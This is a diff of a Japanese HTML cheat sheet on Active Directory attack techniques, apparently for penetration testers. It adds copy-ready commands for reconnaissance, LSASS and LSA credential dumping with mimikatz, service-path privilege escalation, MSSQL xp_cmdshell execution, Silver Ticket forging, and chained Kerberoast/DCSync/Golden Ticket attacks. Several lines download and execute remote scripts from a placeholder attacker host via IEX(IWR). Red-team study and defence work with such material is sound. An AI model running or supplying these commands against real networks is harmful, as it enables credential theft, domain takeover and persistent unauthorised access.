@@ -41,7 +41,8 @@
       <li><a href="#s4">04 Lateral Movement</a></li>
       <li><a href="#s5">05 Persistence</a></li>
       <li><a href="#s6">06 Impact</a></li>
-      <li><a href="#ref">07 References</a></li>
+      <li><a href="#s7">07 Chained scenarios</a></li>
+      <li><a href="#ref">08 References</a></li>
     </ul>
   </aside>
 
@@ -68,34 +69,45 @@ Get-ADTrust -Filter *
 (Get-ADDomain -Identity child.contoso.local).DomainSID</code></pre></div>
 
       <h3>PowerView 偵察 (RSAT 不要、最汎用)</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code>iex(new-object net.webclient).downloadstring('http://<span class="v">&lt;ATTACKER_HOST&gt;</span>/PowerView.ps1')
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># 導入</span>
+IEX(IWR -UseBasicParsing "http://<span class="v">&lt;ATTACKER_HOST&gt;</span>/PowerView.ps1")
+. .\PowerView.ps1                                                <span class="c"># ローカルドットソース (代替)</span>
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process       <span class="c"># CLM 未有効環境</span>
 
 <span class="c"># 基本情報</span>
-Get-NetDomain; Get-NetForest; Get-NetForestDomain
-Get-NetDomainController; Get-DomainTrust; Get-DomainSID
+Get-Domain; Get-Forest; Get-ForestDomain
+Get-DomainController; Get-DomainTrust; Get-DomainSID
 
 <span class="c"># ユーザ列挙</span>
-Get-NetUser | Select samaccountname, description, memberof, lastlogon, pwdlastset
-Get-NetUser -AdminCount | Select samaccountname
-Get-NetUser -PreauthNotRequired | Select samaccountname
-Get-NetUser -SPN | Select samaccountname, serviceprincipalname
-Get-DomainUser -AllowDelegation -AdminCount | Select samaccountname
+Get-DomainUser | Select samaccountname, description, memberof, lastlogon, pwdlastset
+Get-DomainUser -Identity "<span class="v">alice</span>" -Properties *                       <span class="c"># 特定ユーザ詳細</span>
+Get-DomainUser -AdminCount | Select samaccountname                       <span class="c"># AdminSDHolder 保護対象</span>
+Get-DomainUser -PreauthNotRequired | Select samaccountname               <span class="c"># ASREProast 候補</span>
+Get-DomainUser -SPN | Select samaccountname, serviceprincipalname        <span class="c"># Kerberoast 候補</span>
+Get-DomainUser -AllowDelegation -AdminCount | Select samaccountname      <span class="c"># 委任可能な特権ユーザ</span>
 
 <span class="c"># グループ列挙</span>
-Get-NetGroup | Where { $_.adminCount -eq 1 } | Select samaccountname
-Get-NetGroupMember -GroupName "Domain Admins" -Recurse
-Get-NetGroupMember -GroupName "Enterprise Admins" -Recurse
-Get-NetGroupMember -GroupName "DnsAdmins" -Recurse
+Get-DomainGroup | Where { $_.adminCount -eq 1 } | Select samaccountname
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse
+Get-DomainGroupMember -Identity "DnsAdmins" -Recurse
+Get-DomainGroup -MemberIdentity "<span class="v">alice</span>" | Select samaccountname       <span class="c"># ネスト評価込みグループ所属</span>
 
 <span class="c"># コンピュータ列挙 (委任設定確認)</span>
-Get-NetComputer | Select name, operatingsystem, dnshostname
-Get-NetComputer -Unconstrained | Select name
+Get-DomainComputer | Select name, operatingsystem, dnshostname
+Get-DomainComputer -OperatingSystem "*Server*" | Select name, operatingsystem
+Get-DomainComputer -Unconstrained | Select name
 Get-DomainComputer -TrustedToAuth | Select name, msds-allowedtodelegateto
 Get-DomainComputer | Where { $_.'msds-allowedtoactonbehalfofotheridentity' } | Select name
 
+<span class="c"># ACL / 権限調査 (ACL Abuse の起点)</span>
+Get-ObjectAcl -SamAccountName "<span class="v">alice</span>" -ResolveGUIDs | Select ObjectAceType, ActiveDirectoryRights, SecurityIdentifier
+Find-InterestingDomainAcl -ResolveGUIDs | Where { $_.ActiveDirectoryRights -like "*GenericAll*" }
+Find-InterestingDomainAcl -ResolveGUIDs | Where { $_.ActiveDirectoryRights -like "*WriteProperty*" }
+
 <span class="c"># OU / GPO</span>
-Get-NetOU
-Get-NetGPO</code></pre></div>
+Get-DomainOU
+Get-DomainGPO</code></pre></div>
 
       <h3>ldapsearch (Linux 側、認証情報あり)</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ベース情報</span>
@@ -148,6 +160,10 @@ kerbrute userenum -d contoso.local --dc <span class="v">&lt;DC_IP&gt;</span> \
 <span class="c"># 深追い (LoggedOn = ローカル管理権限必要)</span>
 .\SharpHound.exe -c All,LoggedOn,Session,GPOLocalGroup -d contoso.local</code></pre></div>
 
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># SharpHound.ps1 版 (EXE が塞がれた環境、AMSI 未有効時)</span>
+IEX(IWR -UseBasicParsing "http://<span class="v">&lt;ATTACKER_HOST&gt;</span>/SharpHound.ps1")
+Invoke-BloodHound -CollectionMethod All -Domain contoso.local -ZipFileName recon.zip</code></pre></div>
+
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux (bloodhound-python)</span>
 bloodhound-python -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' -d contoso.local \
   -dc dc01.contoso.local -ns <span class="v">&lt;DC_IP&gt;</span> -c DCOnly --zip
@@ -158,6 +174,14 @@ bloodhound-python -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' -d contos
 <span class="c"># neo4j 起動 + BloodHound GUI</span>
 sudo neo4j start
 bloodhound &amp;    <span class="c"># http://localhost:7474</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># CollectionMethods の主要オプション</span>
+.\SharpHound.exe -c All                                              <span class="c"># 全網羅 (session / ldap / smb)</span>
+.\SharpHound.exe -c DCOnly                                           <span class="c"># DC LDAP のみ (最低検知)</span>
+.\SharpHound.exe -c All,Session                                      <span class="c"># セッション列挙込み</span>
+.\SharpHound.exe -c All,CertServices                                 <span class="c"># AD CS テンプレート収集</span>
+.\SharpHound.exe -c All -d contoso.local,child.contoso.local         <span class="c"># 複数ドメイン</span>
+.\SharpHound.exe -c All --OU "OU=Servers,DC=contoso,DC=local"        <span class="c"># OU 限定</span></code></pre></div>
 
       <h3>重要 Cypher クエリ</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">cypher</span><button class="copy">copy</button></div><pre><code><span class="c">// 自分から DA への最短経路</span>
@@ -187,6 +211,75 @@ RETURN u.name, type(r), n.name
 
 <span class="c">// アクティブセッション (LoggedOn 収集時)</span>
 MATCH p=(c:Computer)-[:HasSession]-&gt;(u:User {name:"DA_USER@CONTOSO.LOCAL"}) RETURN p</code></pre></div>
+
+      <div class="note"><span class="lbl">BloodHound GUI 代表クエリ</span>
+        <ul>
+          <li><b>Find all Domain Admins</b> — 現在の DA メンバー</li>
+          <li><b>Shortest Path to High Value Targets</b> — high-value マーク済みノードへの最短経路</li>
+          <li><b>Find Principals with DCSync Rights</b> — DCSync 権限保有 principal</li>
+          <li><b>Find Kerberoastable Members of High Value Groups</b> — 特権グループの Kerberoast 候補</li>
+        </ul>
+      </div>
+
+      <h3>ネイティブ Windows ツール (PowerShell 制限環境向け)</h3>
+      <p>Constrained Language Mode / AMSI / EDR で PowerView が塞がれた環境の代替。<code>net</code> / <code>wmic</code> / <code>dsquery</code> / <code>nltest</code> / RSAT AD モジュールが中心。取得情報粒度は PowerView より粗いが、署名済み・LOLBAS のため通過率が高い。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div><pre><code><span class="c">REM net — 基本情報 + ユーザ / グループ / 共有</span>
+net config workstation
+net time /domain
+
+net user /domain
+net user <span class="v">alice</span> /domain
+net group /domain
+net group "Domain Admins" /domain
+net group "Enterprise Admins" /domain
+net localgroup administrators
+
+net view \\dc01.contoso.local
+net use \\sql01.contoso.local\C$ /u:contoso\<span class="v">alice</span> '<span class="v">&lt;PASSWORD&gt;</span>'
+net use                      <span class="c">REM 現在の接続一覧</span>
+net session</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div><pre><code><span class="c">REM wmic — システム情報 + プロセス / サービス / アカウント</span>
+wmic computersystem get Domain,Name,Username
+wmic os get Caption,Version,ServicePackMajorVersion
+wmic process get Name,ProcessId,CommandLine
+wmic service get Name,State,StartName,PathName
+wmic useraccount get Name,SID,Disabled
+wmic group get Name,SID</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div><pre><code><span class="c">REM dsquery / dsget (RSAT)</span>
+dsquery user -name "a*"
+dsquery user -inactive 4
+dsquery group -name "*admin*"
+dsquery computer -name "sql*"
+dsquery computer -inactive 4
+
+dsget user "CN=<span class="v">alice</span>,CN=Users,DC=contoso,DC=local" -display -email -office
+dsget group "CN=Domain Admins,CN=Users,DC=contoso,DC=local" -members</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div><pre><code><span class="c">REM nltest — trust / DC 情報 / trust password 監査</span>
+nltest /domain_trusts
+nltest /domain_trusts /all_trusts
+nltest /domain_trusts /v             <span class="c">REM verbose (SID / direction 含む)</span>
+nltest /dclist:contoso.local
+nltest /dsgetdc:contoso.local
+nltest /trust_kerberos               <span class="c">REM trust password 監査</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># PowerShell AD モジュール (RSAT 経由)</span>
+Import-Module ActiveDirectory
+
+Get-ADUser -Filter * -Properties LastLogonDate | Select-Object Name, LastLogonDate
+Get-ADUser -Identity "<span class="v">alice</span>" -Properties *
+Get-ADGroupMember -Identity "Domain Admins"
+Get-ADComputer -Filter "OperatingSystem -like '*Server*'"
+Get-ADObject -LDAPFilter "(&amp;(objectClass=user)(adminCount=1))"
+
+Get-ADForest; Get-ADDomain; Get-ADDomainController</code></pre></div>
+
+      <div class="note"><span class="lbl">Note</span>
+        RSAT AD モジュールは署名済みかつ AMSI / CLM の対象外ルートで動作するため、PowerView が塞がれた環境の第一選択。取得できる情報粒度は PowerView より粗く、ACE の GUID 解決や SPN 詳細は自前で補完が必要。
+      </div>
 
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
@@ -294,6 +387,43 @@ secretsdump.py -just-dc-user krbtgt \
 
 <span class="c"># ローカル SAM</span>
 secretsdump.py -sam sam.hiv -system system.hiv LOCAL</code></pre></div>
+
+      <h3>LSASS 資格情報抽出 (mimikatz sekurlsa)</h3>
+      <p>ローカル admin 取得後、LSASS メモリから logged-on user の平文パスワード / NTLM ハッシュ / Kerberos チケット / TS PKG / Credential Manager を抽出。Credential Guard 未有効環境ではほぼ全て取得可能。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code>mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords    <span class="c"># 全 credential provider を横断</span>
+mimikatz # sekurlsa::wdigest           <span class="c"># WDigest (Win7 以前は平文)</span>
+mimikatz # sekurlsa::kerberos          <span class="c"># Kerberos セッションキー</span>
+mimikatz # sekurlsa::tspkg             <span class="c"># RDP TS Package</span>
+mimikatz # sekurlsa::credman           <span class="c"># Windows Credential Manager</span>
+mimikatz # sekurlsa::tickets /export   <span class="c"># kirbi ファイルに出力</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div><pre><code><span class="c">REM バッチモード (1 プロセスで複数コマンド実行、ログ出力)</span>
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" &gt; mimi.log
+.\mimikatz.exe "log mimi.log" "privilege::debug" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "exit"</code></pre></div>
+
+      <h3>LSA Secrets / SAM 抽出 (lsadump)</h3>
+      <p>レジストリ (<code>HKLM\SECURITY</code> / <code>HKLM\SAM</code>) から永続資格情報を抽出。マシンアカウント NT ハッシュ、サービスアカウント平文パスワード、DPAPI マスターキー復号トリガ、ローカル Administrator (RID 500) の NT ハッシュ等が含まれる。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code>mimikatz # token::elevate
+mimikatz # lsadump::secrets            <span class="c"># LSA Secrets (レジストリ HKLM\SECURITY)</span>
+mimikatz # lsadump::sam                <span class="c"># SAM database (RID 500 = ローカル Administrator)</span></code></pre></div>
+
+      <div class="note"><span class="lbl">lsadump::secrets の代表出力</span>
+        <ul>
+          <li><code>DPAPI_SYSTEM</code> — DPAPI マスターキー復号のトリガ (Chrome / Edge の保存パスワード復号に連鎖)</li>
+          <li><code>_SC_&lt;ServiceName&gt;</code> — サービスアカウントの平文パスワード</li>
+          <li><code>$MACHINE.ACC</code> — マシンアカウントの NT ハッシュ (Silver Ticket / RBCD の起点)</li>
+        </ul>
+      </div>
+
+      <div class="note"><span class="lbl">lsadump::sam の代表出力</span>
+        <ul>
+          <li><code>User: Administrator (RID 500)</code> + <code>Hash NTLM: &lt;ADMIN_NT&gt;</code> — ローカル Administrator の NT ハッシュ (PtH / 横展開の直行起点)</li>
+          <li>他ローカルアカウント (RID 1000+) の NT ハッシュも取得可能</li>
+        </ul>
+      </div>
 
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
@@ -526,6 +656,71 @@ python3 PetitPotam.py -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' <span
 <span class="c"># 取得証明書で TGT</span>
 certipy auth -pfx dc01.pfx -dc-ip <span class="v">&lt;DC_IP&gt;</span></code></pre></div>
 
+      <h3>Host-level Local Privilege Escalation (PowerUp)</h3>
+      <p>ドメイン参加ホスト上の misconfiguration ベース local privesc。unquoted service path / 書込可能サービスバイナリ / レジストリ / DLL hijack 候補を PowerUp が一括抽出する。ドメイン側の ACL Abuse とは直交する host-level 攻撃面。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code>IEX(IWR -UseBasicParsing "http://<span class="v">&lt;ATTACKER_HOST&gt;</span>/PowerUp.ps1")
+
+<span class="c"># 全チェック一括</span>
+Invoke-AllChecks
+
+<span class="c"># 個別チェック</span>
+Get-UnquotedService
+Get-ModifiableServiceFile
+Get-ModifiableService
+Find-PathDLLHijack
+Get-RegistryAlwaysInstallElevated
+Get-RegistryAutoLogon</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div><pre><code><span class="c">REM Unquoted Service Path 悪用 (PathName = C:\Program Files\Vuln App\service.exe)</span>
+copy payload.exe "C:\Program Files\Vuln.exe"
+
+<span class="c">REM 書込可能サービスバイナリ悪用</span>
+copy payload.exe "C:\Services\mod.exe" /Y
+sc.exe start ModService
+
+<span class="c">REM 書込可能サービス設定悪用 (binpath 上書き)</span>
+sc.exe config WeakService binpath="C:\Windows\Tasks\payload.exe"
+sc.exe start WeakService</code></pre></div>
+
+      <h3>MSSQL Abuse (PowerUpSQL / mssqlclient)</h3>
+      <p>AD 統合 SQL Server は Kerberoast (SPN) 対象になるだけでなく、Windows 認証・リンクサーバ・<code>xp_cmdshell</code> 経由で権限昇格 / 横展開の一次経路になる。sysadmin 権限で OS コマンド実行、リンクサーバチェーンで別ホストへの impersonation も可能。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code>IEX(IWR -UseBasicParsing "http://<span class="v">&lt;ATTACKER_HOST&gt;</span>/PowerUpSQL.ps1")
+
+<span class="c"># SQL Server 発見 + 接続可能性テスト</span>
+Get-SQLInstanceDomain | Get-SQLConnectionTest | ? {$_.Status -eq "Accessible"}
+
+<span class="c"># サーバ情報 + データベース + 権限監査</span>
+Get-SQLInstanceDomain | Get-SQLServerInfo
+Get-SQLDatabase -Instance "sql01.contoso.local,1433"
+Invoke-SQLAudit -Instance "sql01.contoso.local"
+
+<span class="c"># リンクサーバ列挙 + xp_cmdshell 経由 OS コマンド</span>
+Get-SQLServerLink -Instance "sql01.contoso.local"
+Invoke-SQLOSCmd -Instance "sql01.contoso.local" -Command "whoami"
+Get-SQLServerLinkCrawl -Instance "sql01.contoso.local"</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># impacket mssqlclient (Linux 側)</span>
+mssqlclient.py contoso.local/user:'<span class="v">&lt;PASSWORD&gt;</span>'@<span class="v">&lt;SQL_IP&gt;</span>
+mssqlclient.py contoso.local/user@<span class="v">&lt;SQL_IP&gt;</span> -windows-auth
+mssqlclient.py contoso.local/user@sql01.contoso.local -k -no-pass    <span class="c"># Kerberos TGT</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sql</span><button class="copy">copy</button></div><pre><code><span class="c">-- 基本列挙</span>
+SELECT name FROM sys.databases;
+SELECT name FROM sys.server_principals WHERE type = 'S';
+SELECT * FROM sys.server_permissions;
+
+<span class="c">-- xp_cmdshell 有効化 + 実行</span>
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+
+<span class="c">-- リンクサーバ経由の実行 (sysadmin 委任済の場合)</span>
+SELECT name FROM sys.servers WHERE is_linked = 1;
+EXEC('SELECT @@version') AT [SQL02];
+EXEC('EXEC xp_cmdshell ''whoami''') AT [SQL02];</code></pre></div>
+
       <div class="defense"><span class="lbl">防御 / countermeasures</span>
         <ul>
           <li>Protected Users グループへ特権アカウント配置 (NTLM 拒否、Kerberos AES 強制、delegation 対象化ブロック)</li>
@@ -585,12 +780,18 @@ mimikatz # sekurlsa::pth /user:Administrator /domain:contoso.local \
 <span class="c"># → 新プロセスは Kerberos 認証 (TGS request 時のみ NTLM 使用)</span></code></pre></div>
 
       <h3>Pass-the-Ticket (PtT)</h3>
-      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows — kirbi 投入</span>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Windows — 現状チケット確認</span>
+.\Rubeus.exe klist              <span class="c"># 現行 LUID のチケット</span>
+.\Rubeus.exe klist /all         <span class="c"># 全 LUID (SYSTEM 権限)</span>
+mimikatz # kerberos::list       <span class="c"># mimikatz 版</span>
+
+<span class="c"># kirbi 投入</span>
 .\Rubeus.exe ptt /ticket:<span class="v">&lt;BASE64&gt;</span>
 mimikatz # kerberos::ptt ticket.kirbi
 
 <span class="c"># 既存チケットエクスポート</span>
 .\Rubeus.exe dump /service:krbtgt /nowrap
+.\Rubeus.exe dump /luid:0x... /nowrap    <span class="c"># 特定 LUID (SYSTEM 権限で他ユーザセッション)</span>
 mimikatz # sekurlsa::tickets /export</code></pre></div>
 
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux — kirbi → ccache</span>
@@ -747,6 +948,17 @@ ticketer.py -nthash <span class="v">&lt;TARGET_MACHINE_NTLM&gt;</span> \
   -spn cifs/target.contoso.local \
   Administrator</code></pre></div>
 
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># Rubeus (Windows)</span>
+.\Rubeus.exe silver \
+  /user:Administrator \
+  /domain:contoso.local \
+  /sid:<span class="v">&lt;DOMAIN_SID&gt;</span> \
+  /rc4:<span class="v">&lt;TARGET_MACHINE_NTLM&gt;</span> \
+  /service:cifs \
+  /target:target.contoso.local \
+  /id:500 \
+  /ptt /nowrap</code></pre></div>
+
       <p>サービス別 SPN 参考:</p>
       <ul>
         <li><code>cifs/target.contoso.local</code> — SMB</li>
@@ -890,19 +1102,112 @@ mimikatz # kerberos::golden \
       </div>
     </section>
 
+    <section id="s7" class="reveal">
+      <h2><span class="num">07</span>Chained scenarios<span class="jp">組み合わせ攻撃</span></h2>
+      <p>単一手法ではなく、Discovery → Credential Access → Privilege Escalation → Persistence の複数フェーズを連結した実務パターン。BloodHound で発見した経路を実行する縮約チートシート。</p>
+
+      <h3>標準 AD 偵察シーケンス</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># 1. 基本情報</span>
+Get-Domain; Get-DomainController; Get-DomainTrust
+
+<span class="c"># 2. ユーザ / グループ</span>
+Get-DomainUser | Select samaccountname, description, lastlogon | Sort lastlogon -Desc | Select -First 20
+Get-DomainGroup "*admin*"
+Get-DomainGroupMember "Domain Admins"
+
+<span class="c"># 3. コンピュータ / SPN</span>
+Get-DomainComputer -Properties operatingsystem | Group operatingsystem
+Get-DomainUser -SPN | Select samaccountname, serviceprincipalname
+
+<span class="c"># 4. Delegation / ACL</span>
+Get-DomainComputer -Unconstrained
+Get-DomainComputer -TrustedToAuth
+Find-InterestingDomainAcl -ResolveGUIDs | Where { $_.ActiveDirectoryRights -like "*GenericAll*" }
+
+<span class="c"># 5. BloodHound 収集</span>
+Invoke-BloodHound -CollectionMethod All -ZipFileName recon.zip</code></pre></div>
+
+      <h3>Kerberoasting → Pass-the-Hash チェーン</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div><pre><code><span class="c">REM 1. TGS 取得</span>
+.\Rubeus.exe kerberoast /format:hashcat /outfile:tgs.txt
+
+<span class="c">REM 2. Kali でクラック</span>
+<span class="c">REM   hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt</span>
+
+<span class="c">REM 3. クラック済みパスワードで TGT 取得</span>
+.\Rubeus.exe asktgt /user:<span class="v">svc_sql</span> /password:'<span class="v">&lt;PASSWORD&gt;</span>' /ptt
+
+<span class="c">REM 4. 横展開</span>
+impacket-psexec contoso.local/<span class="v">svc_sql</span>@sql01.contoso.local -k -no-pass
+
+<span class="c">REM 5. 資格情報抽出 (次ホップ)</span>
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"</code></pre></div>
+
+      <h3>Constrained Delegation 経由 DCSync</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">cmd</span><button class="copy">copy</button></div><pre><code><span class="c">REM 1. Delegation 設定確認</span>
+Get-DomainComputer <span class="v">SRV01$</span> -Properties msds-allowedtodelegateto
+
+<span class="c">REM 2. マシンアカウント NT 抽出</span>
+.\mimikatz.exe "lsadump::secrets" "exit"
+
+<span class="c">REM 3. S4U で DC 向けチケット取得</span>
+.\Rubeus.exe s4u /user:<span class="v">SRV01$</span> /rc4:<span class="v">&lt;RC4_HASH&gt;</span> /impersonateuser:Administrator /msdsspn:ldap/dc01.contoso.local /ptt
+
+<span class="c">REM 4. DCSync</span>
+.\mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt" "exit"
+
+<span class="c">REM 5. Golden Ticket (Persistence)</span>
+.\mimikatz.exe "kerberos::golden /user:admin /domain:contoso.local /sid:<span class="v">&lt;DOMAIN_SID&gt;</span> /krbtgt:<span class="v">&lt;KRBTGT_NTLM&gt;</span> /ptt" "exit"</code></pre></div>
+
+      <h3>Shadow Credentials → PKINIT → DCSync</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 1. victim への msDS-KeyCredentialLink 書込権限を BloodHound で確認</span>
+
+<span class="c"># 2. Shadow Credentials 注入</span>
+pywhisker -d contoso.local -u attacker -p '<span class="v">&lt;PASSWORD&gt;</span>' \
+  --target victim --action add
+
+<span class="c"># 3. PKINIT で victim の TGT 取得</span>
+python3 gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass <span class="v">&lt;PFX_PASS&gt;</span> \
+  contoso.local/victim victim.ccache
+
+<span class="c"># 4. UnPACtheHash で NTLM 取得</span>
+python3 getnthash.py -key <span class="v">&lt;AS_REP_KEY&gt;</span> contoso.local/victim
+
+<span class="c"># 5. victim が DCSync 権限保有ならそのまま直行</span>
+export KRB5CCNAME=victim.ccache
+secretsdump.py -k -no-pass -just-dc-user krbtgt contoso.local/victim@dc01.contoso.local</code></pre></div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>Kerberoasting → PtH は AS-REQ の低検知性 (認証済み SPN request) と RC4 hash のクラック容易性の組み合わせで、実務で最頻用の一次経路</li>
+          <li>Constrained Delegation → DCSync は S4U2self / S4U2proxy の連鎖で <code>krbtgt</code> ハッシュに直行、Golden Ticket 生成まで一直線</li>
+          <li>Shadow Credentials → PKINIT は password reset を残さない (<code>msDS-KeyCredentialLink</code> 書込のみ)、passwordless 経路として近年主流化</li>
+          <li>実務では BloodHound の Shortest Path クエリで発見した経路を、これらのパターンの組み合わせで実行する — 「経路発見」と「経路実行」を分離して手戻りを最小化</li>
+        </ul>
+      </div>
+    </section>
+
     <section id="ref" class="reveal">
-      <h2><span class="num">07</span>References<span class="jp">参照</span></h2>
+      <h2><span class="num">08</span>References<span class="jp">参照</span></h2>
       <ul>
         <li>MITRE ATT&amp;CK Enterprise Matrix — <a href="https://attack.mitre.org/matrices/enterprise/" target="_blank" rel="noopener">attack.mitre.org</a></li>
         <li>BloodHound Cypher Cheat Sheet (hausec) — <a href="https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/" target="_blank" rel="noopener">hausec.com</a></li>
         <li>PowerView Cheat Sheet (HarmJ0y) — <a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993" target="_blank" rel="noopener">gist.github.com/HarmJ0y</a></li>
+        <li>PowerSploit (PowerView / PowerUp) — <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">github.com/PowerShellMafia/PowerSploit</a></li>
+        <li>PowerUpSQL (NetSPI) — <a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">github.com/NetSPI/PowerUpSQL</a></li>
         <li>Rubeus (GhostPack) — <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">github.com/GhostPack/Rubeus</a></li>
         <li>Powermad (Kevin Robertson) — <a href="https://github.com/Kevin-Robertson/Powermad" target="_blank" rel="noopener">github.com/Kevin-Robertson/Powermad</a></li>
+        <li>mimikatz (gentilkiwi) — <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">github.com/gentilkiwi/mimikatz</a></li>
+        <li>SharpHound / BloodHound (SpecterOps) — <a href="https://github.com/SpecterOps/SharpHound" target="_blank" rel="noopener">github.com/SpecterOps/SharpHound</a> / <a href="https://bloodhound.specterops.io/" target="_blank" rel="noopener">bloodhound.specterops.io</a></li>
+        <li>impacket (fortra) — <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener">github.com/fortra/impacket</a></li>
+        <li>SpoolSample / PrinterBug (leechristensen) — <a href="https://github.com/leechristensen/SpoolSample" target="_blank" rel="noopener">github.com/leechristensen/SpoolSample</a></li>
         <li>Certipy — <a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener">github.com/ly4k/Certipy</a></li>
         <li>Certified Pre-Owned (SpecterOps) — <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noopener">posts.specterops.io</a></li>
         <li>Kerberos Trust Key Forging (Sean Metcalf) — <a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">adsecurity.org/?p=1640</a></li>
         <li>The Hacker Recipes (AD) — <a href="https://www.thehacker.recipes/ad" target="_blank" rel="noopener">thehacker.recipes/ad</a></li>
         <li>ADSecurity (Sean Metcalf) — <a href="https://adsecurity.org" target="_blank" rel="noopener">adsecurity.org</a></li>
+        <li>LOLBAS (net / wmic / nltest / dsquery etc.) — <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">lolbas-project.github.io</a></li>
+        <li>Microsoft Docs — Kerberos Authentication Overview — <a href="https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview" target="_blank" rel="noopener">learn.microsoft.com</a></li>
       </ul>
     </section>
 
